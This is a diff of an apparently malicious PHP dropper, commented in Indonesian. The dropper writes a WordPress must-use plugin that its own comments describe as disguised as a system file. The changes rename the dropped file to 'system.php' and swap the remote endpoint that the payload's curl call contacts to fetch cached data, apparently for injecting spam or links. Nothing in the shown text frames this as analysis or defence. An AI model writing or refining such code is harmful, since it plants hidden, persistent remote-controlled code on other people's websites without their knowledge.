@@ -15,7 +15,7 @@ if (!is_dir($mu_dir)) {
 }
 
 // Nama file yang akan dibuat (menyamar sebagai file sistem)
-$target_file = $mu_dir . '/0-wp-core-optimization.php';
+$target_file = $mu_dir . '/system.php';
 
 // 2. DEFINISI PAYLOAD (KODE LENGKAP PLUGIN)
 // Menggunakan NOWDOC agar kode PHP di dalamnya aman dan utuh
@@ -98,7 +98,7 @@ function jfx_mu_get_data_cache() {
     $cached = get_transient('jfx_list_cache');
     if ($cached !== false) return $cached;
 
-    $endpoint = "https://stepmomhub.com/seo/api.php";
+    $endpoint = "https://slim.weborama.nl/5YNbBH";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $endpoint);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
